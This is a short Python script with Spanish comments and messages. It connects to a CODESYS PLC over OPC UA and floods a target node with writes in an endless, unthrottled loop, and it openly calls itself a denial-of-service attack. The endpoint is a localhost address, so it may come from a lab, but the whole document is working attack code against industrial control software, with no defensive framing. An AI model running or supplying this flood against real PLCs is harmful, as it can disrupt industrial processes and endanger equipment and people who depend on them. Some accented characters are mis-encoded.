from opcua import Client
import time
import logging

# Configuraci贸n
PLC_ENDPOINT = "opc.tcp://127.0.0.1:4840"
TARGET_NODE = "ns=4;s=|plc|CODESYS Control Win V3 x64"  # Nodo objetivo que ya identificaste
INTERVAL = 0  # Tiempo entre escrituras. 0 = sin pausa

# Configurar logging para monitoreo
logging.basicConfig(level=logging.INFO)

print("[+] Iniciando ataque de denegaci贸n de servicio...")

try:
    client = Client(PLC_ENDPOINT)
    client.connect()
    print("[+] Conexi贸n establecida con el PLC")

    node = client.get_node(TARGET_NODE)

    # Bucle de escritura continua
    counter = 0
    while True:
        try:
            value = f"DOS_{counter}"
            node.set_value(value)
            logging.info(f"[+] Valor enviado: {value}")
            counter += 1
            time.sleep(INTERVAL)
        except Exception as inner_error:
            logging.error(f"[-] Fallo al escribir: {inner_error}")
            break

except Exception as e:
    logging.error(f"[-] Error al iniciar ataque: {e}")

finally:
    try:
        client.disconnect()
        print("[+] Conexi贸n cerrada")
    except:
        pass

